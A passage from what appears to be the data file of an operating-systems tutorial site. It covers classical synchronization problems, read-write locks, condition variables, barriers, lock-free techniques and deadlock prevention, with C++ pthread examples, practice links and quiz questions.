                     } else {\n                              signal(mutex);\n                              // leave\n                            }</div><div class="learn-tip"><b>Tip:</b> These classical problems are not just academic exercises. They model real-world scenarios: producer-consumer appears in message queues and I/O buffers; readers-writers in database locks; dining philosophers in resource allocation; sleeping barber in server request handling.</div></div><div class="learn-section"><div class="learn-h">Cigarette Smokers Problem</div><p class="learn-p">Three smokers sit around a table. Each has an infinite supply of one ingredient: paper, tobacco, or matches. An agent places two random ingredients on the table. The smoker who has the third ingredient picks them up, makes a cigarette, and smokes. The agent waits, then repeats.</p><p class="learn-p">The naive solution (each smoker waits on a semaphore for its missing pair) deadlocks because the agent doesn\'t know which smoker to signal. The solution uses <b>pusher threads</b>: intermediate threads that observe which ingredient was placed and signal the correct smoker.</p><div class="learn-tip"><b>Tip:</b> The Cigarette Smokers Problem demonstrates that you cannot always solve synchronization with just semaphores and the agent/consumer alone &mdash; sometimes you need intermediary threads to decouple signaling logic.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Problem</th><th>Variant</th><th>Key Difference</th></tr><tr><td>Readers-Writers</td><td>Reader priority (1st)</td><td>Readers never wait for other readers; writers may starve</td></tr><tr><td>Readers-Writers</td><td>Writer priority (2nd)</td><td>Once a writer waits, no new readers admitted</td></tr><tr><td>Readers-Writers</td><td>Fair (3rd)</td><td>Requests served in order; no starvation</td></tr><tr><td>Dining Philosophers</td><td>Resource ordering</td><td>Always pick lower-numbered fork first</td></tr><tr><td>Dining Philosophers</td><td>Limit diners</td><td>Allow at most N-1 philosophers to sit</td></tr><tr><td>Dining Philosophers</td><td>Chandy-Misra</td><td>Distributed solution with dirty/clean fork tokens</td></tr><tr><td>Producer-Consumer</td><td>Single buffer</td><td>Binary semaphores sufficient</td></tr><tr><td>Producer-Consumer</td><td>Bounded buffer</td><td>Counting semaphores for empty/full slots</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Semaphore ordering in Producer-Consumer:</b> wait(mutex) before wait(empty) causes deadlock when the buffer is full. Always acquire resource semaphores before the mutex.</li><li><b>Reader starvation in Writer-priority:</b> Under continuous writer arrivals, readers may never gain access.</li><li><b>Dining Philosophers asymmetric solution:</b> Having one philosopher pick up forks in reverse order breaks circular wait. But making ALL reverse recreates the problem.</li><li><b>Sleeping Barber lost wakeup:</b> Without synchronization, the barber might sleep forever while a customer waits.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Problem</th><th>Min Semaphores</th><th>Throughput</th><th>Starvation Risk</th></tr><tr><td>Producer-Consumer (bounded)</td><td>3 (mutex, empty, full)</td><td>Limited by buffer size</td><td>None</td></tr><tr><td>Readers-Writers (1st)</td><td>2 (rw_mutex, mutex) + counter</td><td>High read, low write</td><td>Writers</td></tr><tr><td>Readers-Writers (2nd)</td><td>3-4 semaphores + counters</td><td>Balanced</td><td>Readers</td></tr><tr><td>Dining Philosophers</td><td>5 (one per fork) + 1 (limit)</td><td>At most 2 eating simultaneously</td><td>Depends on solution</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Why must wait(empty) come before wait(mutex) in Producer-Consumer?</b><br>A: If the producer calls wait(mutex) first and the buffer is full, it holds the mutex while blocked on wait(empty). The consumer cannot acquire the mutex to consume an item, causing deadlock.</p><p class="learn-p"><b>Q2: How do you solve Dining Philosophers without deadlock?</b><br>A: Four approaches: (1) Resource ordering (lower-numbered fork first), (2) Limit to N-1 philosophers sitting, (3) Chandy-Misra for distributed settings, (4) Monitor: pick up both forks atomically when both available.</p><p class="learn-p"><b>Q3: Real-world equivalent of the Readers-Writers problem?</b><br>A: Database concurrency control: SELECT queries are readers (concurrent), UPDATE/INSERT queries are writers (exclusive). Read-write locks directly implement this pattern.</p><p class="learn-p"><b>Q4: How would you implement a fair Readers-Writers solution?</b><br>A: Use a turnstile semaphore: all new readers and writers must pass through it. A waiting writer holds the turnstile, preventing new readers. This serves requests roughly in FIFO order.</p><p class="learn-p"><b>Q5: Where does Producer-Consumer appear in real systems?</b><br>A: Message queues (Kafka, RabbitMQ), OS pipe buffers, TCP send/receive buffers, logging frameworks, and GPU command queues.</p></div>',
          code: `// Classical Synchronization Problems in C++ using pthreads
#include <iostream>
#include <pthread.h>
#include <semaphore.h>
#include <unistd.h>
#include <queue>
using namespace std;

// ===== PRODUCER-CONSUMER (BOUNDED BUFFER) =====
const int BUFFER_SIZE = 5;
queue<int> buffer;
pthread_mutex_t bufMutex = PTHREAD_MUTEX_INITIALIZER;
sem_t emptySlots, fullSlots;

void* producer(void* arg) {
    for (int i = 1; i <= 10; i++) {
        sem_wait(&emptySlots);           // Wait for empty slot
        pthread_mutex_lock(&bufMutex);   // Enter critical section
        buffer.push(i);
        cout << "Produced: " << i << " (size=" << buffer.size() << ")" << endl;
        pthread_mutex_unlock(&bufMutex); // Exit critical section
        sem_post(&fullSlots);            // Signal a full slot
        usleep(100000);
    }
    return NULL;
}

void* consumer(void* arg) {
    for (int i = 0; i < 10; i++) {
        sem_wait(&fullSlots);            // Wait for full slot
        pthread_mutex_lock(&bufMutex);
        int item = buffer.front();
        buffer.pop();
        cout << "Consumed: " << item << " (size=" << buffer.size() << ")" << endl;
        pthread_mutex_unlock(&bufMutex);
        sem_post(&emptySlots);           // Signal an empty slot
        usleep(150000);
    }
    return NULL;
}

// ===== READERS-WRITERS =====
int sharedData = 0;
int readerCount = 0;
pthread_mutex_t rcMutex = PTHREAD_MUTEX_INITIALIZER; // Protects readerCount
sem_t rwMutex; // Exclusive access for writers

void* reader(void* arg) {
    int id = *(int*)arg;
    pthread_mutex_lock(&rcMutex);
    readerCount++;
    if (readerCount == 1) sem_wait(&rwMutex); // First reader locks
    pthread_mutex_unlock(&rcMutex);

    // Reading
    cout << "Reader " << id << " reads: " << sharedData << endl;
    usleep(200000);

    pthread_mutex_lock(&rcMutex);
    readerCount--;
    if (readerCount == 0) sem_post(&rwMutex); // Last reader unlocks
    pthread_mutex_unlock(&rcMutex);
    return NULL;
}

void* writer(void* arg) {
    int id = *(int*)arg;
    sem_wait(&rwMutex); // Exclusive access
    sharedData += 10;
    cout << "Writer " << id << " wrote: " << sharedData << endl;
    usleep(300000);
    sem_post(&rwMutex);
    return NULL;
}

// ===== DINING PHILOSOPHERS (Resource Ordering) =====
const int NUM_PHIL = 5;
pthread_mutex_t chopstick[NUM_PHIL];

void* philosopher(void* arg) {
    int id = *(int*)arg;
    int left = id;
    int right = (id + 1) % NUM_PHIL;

    // Resource ordering: always pick lower-numbered first
    int first = min(left, right);
    int second = max(left, right);

    // Thinking
    cout << "Philosopher " << id << " thinking..." << endl;
    usleep(100000);

    // Pick up chopsticks in order
    pthread_mutex_lock(&chopstick[first]);
    pthread_mutex_lock(&chopstick[second]);

    // Eating
    cout << "Philosopher " << id << " eating." << endl;
    usleep(200000);

    // Put down chopsticks
    pthread_mutex_unlock(&chopstick[second]);
    pthread_mutex_unlock(&chopstick[first]);
    cout << "Philosopher " << id << " done eating." << endl;
    return NULL;
}

int main() {
    // --- Producer-Consumer ---
    cout << "=== Producer-Consumer ===" << endl;
    sem_init(&emptySlots, 0, BUFFER_SIZE);
    sem_init(&fullSlots, 0, 0);
    pthread_t prod, cons;
    pthread_create(&prod, NULL, producer, NULL);
    pthread_create(&cons, NULL, consumer, NULL);
    pthread_join(prod, NULL);
    pthread_join(cons, NULL);

    // --- Readers-Writers ---
    cout << "\\n=== Readers-Writers ===" << endl;
    sem_init(&rwMutex, 0, 1);
    pthread_t readers[3], writers[2];
    int rids[] = {1,2,3}, wids[] = {1,2};
    for (int i = 0; i < 3; i++)
        pthread_create(&readers[i], NULL, reader, &rids[i]);
    for (int i = 0; i < 2; i++)
        pthread_create(&writers[i], NULL, writer, &wids[i]);
    for (int i = 0; i < 3; i++) pthread_join(readers[i], NULL);
    for (int i = 0; i < 2; i++) pthread_join(writers[i], NULL);

    // --- Dining Philosophers ---
    cout << "\\n=== Dining Philosophers ===" << endl;
    for (int i = 0; i < NUM_PHIL; i++)
        pthread_mutex_init(&chopstick[i], NULL);
    pthread_t phil[NUM_PHIL];
    int pids[NUM_PHIL];
    for (int i = 0; i < NUM_PHIL; i++) {
        pids[i] = i;
        pthread_create(&phil[i], NULL, philosopher, &pids[i]);
    }
    for (int i = 0; i < NUM_PHIL; i++)
        pthread_join(phil[i], NULL);

    // Cleanup
    sem_destroy(&emptySlots); sem_destroy(&fullSlots);
    sem_destroy(&rwMutex);
    for (int i = 0; i < NUM_PHIL; i++)
        pthread_mutex_destroy(&chopstick[i]);

    return 0;
}`,
          problems: [
            ['Producer Consumer Problem', 'https://www.geeksforgeeks.org/producer-consumer-problem-using-semaphores-set-1/', 'Medium'],
            ['Dining Philosophers (LeetCode 1226)', 'https://leetcode.com/problems/the-dining-philosophers/', 'Medium'],
            ['Readers-Writers Problem', 'https://www.geeksforgeeks.org/readers-writers-problem-set-1-introduction-and-readers-preference-solution/', 'Hard'],
            ['Print Zero Even Odd (LeetCode 1116)', 'https://leetcode.com/problems/print-zero-even-odd/', 'Medium'],
            ['Traffic Light Controlled Intersection (LeetCode 1279)', 'https://leetcode.com/problems/traffic-light-controlled-intersection/', 'Easy'],
          ],
          mcqs: [
            {q: 'In the Producer-Consumer problem with semaphores, what happens if the producer calls wait(mutex) before wait(empty)?', o: ['Nothing changes', 'Deadlock can occur when the buffer is full', 'The consumer starves', 'The program runs faster'], a: 1},
            {q: 'In the Dining Philosophers problem, what condition is violated if all philosophers pick up their left chopstick first?', o: ['Mutual exclusion', 'Hold and wait', 'Circular wait leads to deadlock', 'No preemption'], a: 2},
            {q: 'In the first Readers-Writers problem, which entity may suffer from starvation?', o: ['Readers', 'Writers', 'Both readers and writers', 'Neither'], a: 1},
            {q: 'How many semaphores are needed for a bounded-buffer Producer-Consumer solution?', o: ['1 (mutex only)', '2 (mutex + full)', '3 (mutex + empty + full)', '4 (mutex + empty + full + sync)'], a: 2},
            {q: 'Which Dining Philosophers solution guarantees no deadlock by breaking circular wait?', o: ['All pick up left first', 'Resource ordering (always pick lower-numbered fork first)', 'Each philosopher uses a timeout', 'Random backoff'], a: 1},
            {q: 'In the Sleeping Barber problem, what happens if the waiting room is full?', o: ['The customer waits outside', 'The customer leaves immediately', 'The barber wakes up', 'A new chair is added'], a: 1},
          ],
        },
        {
          t: 'Read-Write Locks, Condition Variables & Barriers',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">A configuration service read by 1000 microservices but updated once per hour is a textbook case for read-write locks: concurrent reads with exclusive writes. Condition variables power every thread-safe queue and event loop. Barriers synchronize parallel phases in scientific computing. These are the building blocks professional engineers use daily.</p></div><div class="learn-section"><div class="learn-h">Read-Write Locks (rwlock)</div><p class="learn-p">A <b>read-write lock</b> (also called shared-exclusive lock) implements the Readers-Writers pattern as a reusable primitive. Multiple readers can hold the lock concurrently, but a writer needs exclusive access.</p><div class="learn-code">// POSIX Read-Write Lock\npthread_rwlock_t rwlock;\npthread_rwlock_init(&amp;rwlock, NULL);\n\n// Reader:\npthread_rwlock_rdlock(&amp;rwlock);  // shared lock\n// ... read shared data ...\npthread_rwlock_unlock(&amp;rwlock);\n\n// Writer:\npthread_rwlock_wrlock(&amp;rwlock);  // exclusive lock\n// ... modify shared data ...\npthread_rwlock_unlock(&amp;rwlock);\n\n// C++ equivalent (C++17):\n#include &lt;shared_mutex&gt;\nstd::shared_mutex rw;\nrw.lock_shared();    // reader\nrw.unlock_shared();\nrw.lock();           // writer\nrw.unlock();</div><p class="learn-p"><b>Fairness policies:</b></p><ul class="learn-list"><li><b>Reader-preference:</b> New readers can acquire the lock even if a writer is waiting. Writers may starve.</li><li><b>Writer-preference:</b> Once a writer is waiting, no new readers are admitted. Readers may starve.</li><li><b>Fair (FIFO):</b> Requests served in order. No starvation but lower throughput.</li></ul></div><div class="learn-section"><div class="learn-h">Condition Variables</div><p class="learn-p">A <b>condition variable</b> allows threads to block until a specific condition becomes true. Always used with a mutex. The key insight: instead of busy-waiting (spinning) on a condition, a thread sleeps and is woken up only when the condition changes.</p><div class="learn-code">pthread_mutex_t mutex;\npthread_cond_t cond;\nint buffer_count = 0;\n\n// Producer:\npthread_mutex_lock(&amp;mutex);\n// ... add item to buffer ...\nbuffer_count++;\npthread_cond_signal(&amp;cond);  // wake one waiting consumer\npthread_mutex_unlock(&amp;mutex);\n\n// Consumer:\npthread_mutex_lock(&amp;mutex);\nwhile (buffer_count == 0)              // MUST use while, not if\n    pthread_cond_wait(&amp;cond, &amp;mutex);  // atomically unlocks mutex &amp; sleeps\n// ... remove item from buffer ...\nbuffer_count--;\npthread_mutex_unlock(&amp;mutex);</div><div class="learn-warn"><b>Critical:</b> Always use <code>while</code> (not <code>if</code>) around <code>cond_wait</code>. Spurious wakeups can occur — the thread may be woken without the condition being true. The while loop re-checks the condition after wakeup.</div><p class="learn-p"><b>signal vs broadcast:</b></p><ul class="learn-list"><li><code>pthread_cond_signal</code> — wakes <b>one</b> waiting thread</li><li><code>pthread_cond_broadcast</code> — wakes <b>all</b> waiting threads (use when multiple threads may be able to proceed, e.g., buffer went from full to empty)</li></ul></div><div class="learn-section"><div class="learn-h">Barriers</div><p class="learn-p">A <b>barrier</b> is a synchronization point where threads must all arrive before any can proceed. Used in parallel algorithms where a computation phase must complete before the next begins.</p><div class="learn-code">pthread_barrier_t barrier;\npthread_barrier_init(&amp;barrier, NULL, NUM_THREADS);\n\n// Each thread:\nvoid* worker(void* arg) {\n    // Phase 1: compute local portion\n    compute_phase1();\n\n    pthread_barrier_wait(&amp;barrier);  // all threads wait here\n    // ↑ No thread passes until ALL have arrived\n\n    // Phase 2: can safely read other threads\' phase 1 results\n    compute_phase2();\n    return NULL;\n}</div></div><div class="learn-section"><div class="learn-h">Spinlocks vs Mutexes</div><table class="learn-table"><tr><th>Feature</th><th>Spinlock</th><th>Mutex</th></tr><tr><td>Waiting behavior</td><td>Busy-wait (loops checking the lock)</td><td>Sleep (OS puts thread to sleep)</td></tr><tr><td>CPU usage while waiting</td><td>100% on one core</td><td>~0% (sleeping)</td></tr><tr><td>Context switch</td><td>None (stays on CPU)</td><td>Two (sleep + wake)</td></tr><tr><td>Best for</td><td>Very short critical sections (< few μs)</td><td>Longer critical sections, I/O</td></tr><tr><td>Used in</td><td>Kernel code, lock-free data structures</td><td>Application code, general purpose</td></tr></table><div class="learn-tip"><b>Interview tip:</b> "When would you use a spinlock over a mutex?" — When the critical section is extremely short (nanoseconds) and context switch overhead would exceed the wait time. Linux kernel uses spinlocks extensively for this reason.</div></div><div class="learn-section"><div class="learn-h">Lock-Free and Wait-Free Data Structures</div><p class="learn-p"><b>Lock-free</b>: At least one thread makes progress at any time (no global blocking). Uses atomic operations (CAS — Compare-And-Swap).</p><p class="learn-p"><b>Wait-free</b>: Every thread makes progress in bounded steps (strongest guarantee). Very hard to implement.</p><div class="learn-code">// Compare-And-Swap (CAS) — the building block\n// Atomically: if *addr == expected, set *addr = desired, return true\nbool cas(int* addr, int expected, int desired);\n\n// Lock-free stack push using CAS:\nvoid push(Node* node) {\n    do {\n        node-&gt;next = top;        // read current top\n    } while (!cas(&amp;top, node-&gt;next, node));  // retry if top changed\n}</div><div class="learn-warn"><b>ABA problem:</b> Thread reads A, another thread changes A→B→A, first thread\'s CAS succeeds but the state changed. Fix: use tagged pointers (add a version counter) or hazard pointers.</div></div><div class="learn-section"><div class="learn-h">SeqLock (Sequence Lock)</div><p class="learn-p">A <b>SeqLock</b> is a Linux kernel primitive optimized for <b>read-heavy workloads with a single writer</b>. It uses a sequence counter instead of reader locks:</p><div class="learn-code">// Writer:\nwrite_seqlock(&amp;lock);      // increments sequence to odd\n// ... write shared data ...\nwrite_sequnlock(&amp;lock);    // increments sequence to even\n\n// Reader (lock-free, may retry):\nunsigned seq;\ndo {\n    seq = read_seqbegin(&amp;lock);  // read sequence number\n    // ... read shared data ...\n} while (read_seqretry(&amp;lock, seq));  // retry if writer was active</div><p class="learn-p">Readers never block the writer and never acquire a lock. If a write occurs during a read, the reader simply retries. Trade-off: readers may waste work on retries, but writes are never delayed.</p></div><div class="learn-section"><div class="learn-h">Futex (Fast Userspace Mutex)</div><p class="learn-p">A <b>futex</b> is the mechanism underlying all Linux userspace synchronization (mutexes, semaphores, condition variables, barriers). It combines a userspace atomic operation with a kernel wait queue:</p><ul class="learn-list"><li><b>Uncontended fast path:</b> A single atomic CAS in userspace &mdash; no system call needed (~25 ns).</li><li><b>Contended slow path:</b> The thread calls <code>futex(FUTEX_WAIT)</code> to sleep in the kernel until another thread calls <code>futex(FUTEX_WAKE)</code>.</li></ul><p class="learn-p">This design makes the common case (no contention) extremely fast while still handling contention correctly via the kernel. All glibc pthread primitives are built on futexes.</p></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Primitive</th><th>Pattern</th><th>Key Consideration</th></tr><tr><td>RWLock (Reader-preference)</td><td>Max concurrency for readers</td><td>Writers may starve</td></tr><tr><td>RWLock (Writer-preference)</td><td>Writers take priority</td><td>Readers may starve</td></tr><tr><td>RWLock (Fair)</td><td>FIFO ordering</td><td>Lower throughput but no starvation</td></tr><tr><td>Condition Variable + Mutex</td><td>Wait-until-condition pattern</td><td>Must use while loop, not if</td></tr><tr><td>Barrier</td><td>Phase synchronization</td><td>All threads must arrive before any proceed</td></tr><tr><td>Countdown Latch</td><td>One-time barrier</td><td>Threads wait until count reaches zero; not reusable</td></tr><tr><td>CAS (Compare-And-Swap)</td><td>Lock-free algorithms</td><td>ABA problem requires tagged pointers</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>cond_wait must be in a while loop:</b> Spurious wakeups can occur. Another thread may change the condition between signal() and the woken thread acquiring the mutex.</li><li><b>signal vs broadcast:</b> Use signal() when exactly one waiter should proceed. Use broadcast() when multiple waiters may benefit or when they check different conditions.</li><li><b>RWLock downgrade is not always safe:</b> Some implementations do not support atomically downgrading a write lock to a read lock.</li><li><b>ABA problem in lock-free code:</b> Thread reads A, another changes A-B-A. CAS succeeds but state changed semantically. Fix with tagged/versioned pointers.</li><li><b>Barrier reuse:</b> After all threads pass, it must be reset. Some implementations auto-reset; others require explicit reset.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Approach</th><th>Lock Overhead</th><th>Scalability</th><th>Complexity</th></tr><tr><td>Mutex (pessimistic)</td><td>Low</td><td>Poor (serializes all access)</td><td>Simple</td></tr><tr><td>Read-Write Lock</td><td>Medium</td><td>Good (readers parallel)</td><td>Moderate</td></tr><tr><td>Lock-free (CAS-based)</td><td>Very low</td><td>Excellent</td><td>Very high (ABA, memory ordering)</td></tr><tr><td>Wait-free</td><td>Lowest</td><td>Best (bounded steps)</td><td>Extremely high</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: When should you use broadcast() instead of signal()?</b><br>A: Use broadcast when: (1) multiple threads may be able to proceed, (2) different threads wait on different conditions using the same CV, or (3) you are unsure which waiter should proceed.</p><p class="learn-p"><b>Q2: What is the ABA problem?</b><br>A: Thread T1 reads value A, is preempted, another thread changes A to B to A. T1\'s CAS succeeds but the state may have changed semantically. Solutions: tagged pointers or hazard pointers.</p><p class="learn-p"><b>Q3: Why are read-write locks not always better than mutexes?</b><br>A: RW locks have higher per-operation overhead (~30-50 ns vs ~25 ns for mutex). If reads are very short or write ratio is high, the overhead exceeds the benefit of concurrent reads.</p><p class="learn-p"><b>Q4: What is a memory barrier?</b><br>A: Modern CPUs reorder memory operations. A memory barrier prevents reordering across it, ensuring operations before are visible to other cores before operations after it.</p><p class="learn-p"><b>Q5: How to implement a thread-safe queue using condition variables?</b><br>A: Use a mutex, a not_empty CV for consumers, a not_full CV for producers. Enqueue: lock, while full wait(not_full), add, signal(not_empty), unlock. Dequeue: lock, while empty wait(not_empty), remove, signal(not_full), unlock.</p></div>',
          code: `// Read-Write Locks, Condition Variables, and Barriers in C++
#include <iostream>
#include <thread>
#include <shared_mutex>
#include <mutex>
#include <condition_variable>
#include <vector>
#include <chrono>
using namespace std;

// Shared data protected by read-write lock
shared_mutex rw_mutex;
int shared_data = 0;

void reader(int id) {
    shared_lock<shared_mutex> lock(rw_mutex);
    cout << "Reader " << id << " reads: " << shared_data << endl;
}

void writer(int id, int value) {
    unique_lock<shared_mutex> lock(rw_mutex);
    shared_data = value;
    cout << "Writer " << id << " wrote: " << value << endl;
}

// Producer-Consumer with condition variable
mutex mtx;
condition_variable cv;
vector<int> buffer;
const int MAX_BUF = 5;
bool done = false;

void producer() {
    for (int i = 0; i < 10; i++) {
        unique_lock<mutex> lock(mtx);
        cv.wait(lock, [] { return buffer.size() < MAX_BUF; });
        buffer.push_back(i);
        cout << "Produced: " << i << endl;
        cv.notify_all();
    }
    unique_lock<mutex> lock(mtx);
    done = true;
    cv.notify_all();
}

void consumer() {
    while (true) {
        unique_lock<mutex> lock(mtx);
        cv.wait(lock, [] { return !buffer.empty() || done; });
        if (buffer.empty() && done) break;
        int val = buffer.back();
        buffer.pop_back();
        cout << "Consumed: " << val << endl;
        cv.notify_all();
    }
}

int main() {
    // Read-Write Lock demo
    cout << "=== Read-Write Lock ===" << endl;
    vector<thread> threads;
    threads.emplace_back(writer, 1, 42);
    for (int i = 0; i < 3; i++)
        threads.emplace_back(reader, i);
    threads.emplace_back(writer, 2, 99);
    for (auto& t : threads) t.join();
    threads.clear();

    // Producer-Consumer with condition variable
    cout << "\\n=== Condition Variable (Producer-Consumer) ===" << endl;
    thread prod(producer);
    thread cons(consumer);
    prod.join();
    cons.join();

    return 0;
}`,
          problems: [
            ['Design Bounded Blocking Queue (LeetCode 1188)', 'https://leetcode.com/problems/design-bounded-blocking-queue/', 'Medium'],
            ['Print FooBar Alternately (LeetCode 1115)', 'https://leetcode.com/problems/print-foobar-alternately/', 'Medium'],
            ['Web Crawler Multithreaded (LeetCode 1242)', 'https://leetcode.com/problems/web-crawler-multithreaded/', 'Medium'],
          ],
          mcqs: [
            {q: 'Why must you use while (not if) with condition variables?', o: ['For better performance', 'Because spurious wakeups can occur', 'Because the mutex might not be locked', 'To prevent deadlocks'], a: 1},
            {q: 'When is a spinlock preferred over a mutex?', o: ['Always in user-space code', 'When the critical section is very short and context-switch overhead exceeds wait time', 'When threads need to sleep', 'When there are many competing threads'], a: 1},
            {q: 'CAS (Compare-And-Swap) is the basis for:', o: ['Mutex implementation', 'Lock-free data structures', 'Semaphores only', 'Thread creation'], a: 1},
            {q: 'In a SeqLock, what happens when a reader detects a concurrent write?', o: ['The reader blocks', 'The reader retries its read operation', 'The writer is aborted', 'An exception is thrown'], a: 1},
            {q: 'What is the fast path of a futex-based mutex?', o: ['A kernel system call', 'An atomic CAS in userspace with no syscall', 'A busy-wait spinloop', 'A signal to the scheduler'], a: 1},
            {q: 'What is the difference between lock-free and wait-free?', o: ['They are identical', 'Lock-free: at least one thread progresses; wait-free: every thread progresses in bounded steps', 'Wait-free uses locks; lock-free does not', 'Lock-free is faster than wait-free'], a: 1},
          ],
        },
      ],
    },

    // ===== TAB: DEADLOCKS =====
    {
      id: 'dead', t: 'Deadlocks',
      topics: [
        // ----- Topic 0: Deadlock Conditions & Prevention -----
        {
          t: 'Deadlock Conditions & Prevention',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">In 2017, a cloud provider experienced a cascading deadlock when microservice A held a database lock while waiting for microservice B\'s API, and service B held a connection pool lock while waiting for service A\'s API. Both services froze, taking down an e-commerce platform during peak traffic. Deadlocks cause real production outages.</p></div><div class="learn-section"><div class="learn-h">What is a Deadlock?</div><p class="learn-p">A <b>deadlock</b> is a situation where a set of processes are blocked because each process is holding a resource and waiting for another resource held by another process in the set. No process can make progress.</p><p class="learn-p"><b>Example:</b> Process P1 holds resource R1 and wants R2. Process P2 holds R2 and wants R1. Neither can proceed.</p></div><div class="learn-section"><div class="learn-h">Coffman\'s Four Necessary Conditions</div><p class="learn-p">A deadlock can occur <b>if and only if</b> all four of these conditions hold simultaneously:</p><ol class="learn-list"><li><b>Mutual Exclusion:</b> At least one resource must be held in a non-sharable mode. Only one process at a time can use the resource.</li><li><b>Hold and Wait:</b> A process must be holding at least one resource and waiting to acquire additional resources held by other processes.</li><li><b>No Preemption:</b> Resources cannot be forcibly taken away from a process; they must be released voluntarily.</li><li><b>Circular Wait:</b> There exists a circular chain of processes, each waiting for a resource held by the next process in the chain.</li></ol><div class="learn-tip"><b>Tip:</b> Remember these four conditions by the mnemonic <b>MHNC</b> (Mutual exclusion, Hold and wait, No preemption, Circular wait). If you can break ANY one condition, deadlock cannot occur.</div></div><div class="learn-section"><div class="learn-h">Resource Allocation Graph (RAG)</div><p class="learn-p">A <b>Resource Allocation Graph</b> is a directed graph used to describe deadlocks:</p><ul class="learn-list"><li><b>Process nodes:</b> Circles (P1, P2, ...)</li><li><b>Resource nodes:</b> Rectangles with dots representing instances (R1 with 2 dots = 2 instances)</li><li><b>Request edge:</b> P<sub>i</sub> &rarr; R<sub>j</sub> (process requests resource)</li><li><b>Assignment edge:</b> R<sub>j</sub> &rarr; P<sub>i</sub> (resource is assigned to process)</li></ul><p class="learn-p"><b>Deadlock detection using RAG:</b></p><ul class="learn-list"><li>If the graph contains a <b>cycle</b> and each resource type has <b>only one instance</b>, then a deadlock exists.</li><li>If resources have <b>multiple instances</b>, a cycle is necessary but <b>not sufficient</b> for deadlock.</li></ul></div><div class="learn-section"><div class="learn-h">Deadlock Prevention</div><p class="learn-p"><b>Deadlock prevention</b> ensures that at least one of the four necessary conditions cannot hold:</p><table class="learn-table"><tr><th>Condition</th><th>Prevention Strategy</th><th>Drawback</th></tr><tr><td>Mutual Exclusion</td><td>Use sharable resources (e.g., read-only files). Cannot be applied to inherently non-sharable resources like printers.</td><td>Not always possible</td></tr><tr><td>Hold and Wait</td><td><b>Option 1:</b> Request all resources before execution starts. <b>Option 2:</b> Release all held resources before requesting new ones.</td><td>Low resource utilization, possible starvation</td></tr><tr><td>No Preemption</td><td>If a process holding resources requests one that cannot be allocated, release all held resources and restart later.</td><td>Only works for resources whose state can be saved (CPU registers, memory)</td></tr><tr><td>Circular Wait</td><td>Impose a <b>total ordering</b> on all resource types. Processes must request resources in increasing order of enumeration.</td><td>May be inconvenient; requires knowing all resource types in advance</td></tr></table><div class="learn-warn"><b>Warning:</b> Preventing mutual exclusion is generally not practical since many resources (printers, tape drives, mutexes) are inherently non-sharable. The most practical prevention strategy is usually <b>breaking circular wait</b> via resource ordering.</div></div><div class="learn-section"><div class="learn-h">Deadlock Avoidance</div><p class="learn-p"><b>Deadlock avoidance</b> requires advance knowledge of resource needs. The system dynamically examines the resource-allocation state to ensure a <b>safe state</b> is maintained.</p><p class="learn-p">A state is <b>safe</b> if there exists a <b>safe sequence</b> of all processes such that each process can obtain all needed resources from currently available resources plus those held by all preceding processes in the sequence. If no safe sequence exists, the state is <b>unsafe</b>.</p><div class="learn-tip"><b>Tip:</b> An <b>unsafe state</b> does NOT mean deadlock will definitely occur &mdash; it means deadlock <b>might</b> occur. A <b>safe state</b> guarantees no deadlock. Deadlock avoidance ensures the system never enters an unsafe state.</div><p class="learn-p">The most famous deadlock avoidance algorithm is the <b>Banker\'s Algorithm</b> (covered in the next topic).</p></div><div class="learn-section"><div class="learn-h">Deadlock Handling Strategies Comparison</div><table class="learn-table"><tr><th>Strategy</th><th>Description</th><th>Used In</th></tr><tr><td>Prevention</td><td>Structurally eliminate one of the four conditions</td><td>Simple embedded systems</td></tr><tr><td>Avoidance</td><td>Dynamically check before granting resources (Banker\'s)</td><td>Systems with known max resource needs</td></tr><tr><td>Detection + Recovery</td><td>Allow deadlock, detect it, then recover</td><td>Databases (transaction rollback)</td></tr><tr><td>Ignorance (Ostrich)</td><td>Ignore the problem entirely</td><td>Most general-purpose OS (Linux, Windows)</td></tr></table><div class="learn-section"><div class="learn-h">Livelock</div><p class="learn-p"><b>Livelock</b> is a situation where processes are not blocked but still make no progress because they keep changing state in response to each other. Unlike deadlock (processes are frozen), livelocked processes are <b>active but unproductive</b>.</p><p class="learn-p"><b>Classic example:</b> Two people in a narrow hallway. Each steps aside to let the other pass, but they both step to the same side. They keep alternating without either passing.</p><p class="learn-p"><b>Real-world example:</b> Two Ethernet stations detect a collision and back off for the same random interval, then collide again. Fix: randomized exponential backoff (each station picks a different delay).</p><div class="learn-tip"><b>Tip:</b> Livelock is harder to detect than deadlock because processes are technically running. Look for repeated state oscillation with no forward progress.</div></div><div class="learn-section"><div class="learn-h">Distributed Deadlocks</div><p class="learn-p">In distributed systems, deadlocks can span multiple machines. No single node has the complete resource-allocation picture. Detection approaches:</p><ul class="learn-list"><li><b>Centralized detection:</b> A coordinator collects wait-for graph fragments from all nodes and checks for cycles. Problem: single point of failure, network overhead.</li><li><b>Distributed detection (Chandy-Misra-Haas):</b> Probe messages are passed along edges of the wait-for graph. If a probe returns to the initiator, a cycle exists.</li><li><b>Timeout-based:</b> If a transaction waits too long, assume deadlock and abort it. Simple but may abort non-deadlocked transactions (false positives).</li></ul><p class="learn-p">Most distributed databases (e.g., Google Spanner, CockroachDB) use <b>timeout-based detection</b> with <b>Wait-Die or Wound-Wait</b> prevention schemes.</p></div></div><div class="learn-warn"><b>Warning:</b> Most real operating systems (Linux, Windows, macOS) use the <b>Ostrich Algorithm</b> &mdash; they simply ignore deadlocks! The reasoning is that the overhead of prevention/avoidance is not justified for the rare occurrence of deadlocks in practice. Deadlocks are handled manually (e.g., user kills a hung process).</div></div><div class="learn-section"><div 